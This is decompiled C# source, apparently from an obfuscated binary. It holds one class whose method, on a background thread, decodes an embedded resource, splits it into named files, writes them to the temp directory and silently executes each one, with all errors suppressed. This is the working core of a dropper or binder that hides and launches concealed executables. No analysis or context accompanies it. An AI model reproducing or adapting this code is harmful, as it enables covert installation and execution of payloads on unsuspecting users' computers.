using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;

namespace ns0;

internal class Class4
{
	[CompilerGenerated]
	private static ThreadStart _003C_003E9__CachedAnonymousMethodDelegate1;

	public static void smethod_0()
	{
		ThreadStart start = delegate
		{
			ResourceManager resourceManager = new ResourceManager("b", Assembly.GetExecutingAssembly());
			byte[] buffer = Class10.smethod_1((byte[])resourceManager.GetObject("b"), bool_0: false);
			MemoryStream input = new MemoryStream(buffer);
			BinaryReader binaryReader = new BinaryReader(input);
			while (binaryReader.PeekChar() != -1)
			{
				string text = binaryReader.ReadString();
				int count = binaryReader.ReadInt32();
				byte[] bytes = binaryReader.ReadBytes(count);
				try
				{
					if (!File.Exists(Path.GetTempPath() + text))
					{
						File.WriteAllBytes(Path.GetTempPath() + text, bytes);
					}
					Process.Start(Path.GetTempPath() + text);
				}
				catch
				{
				}
			}
		};
		new Thread(start).Start();
	}
}
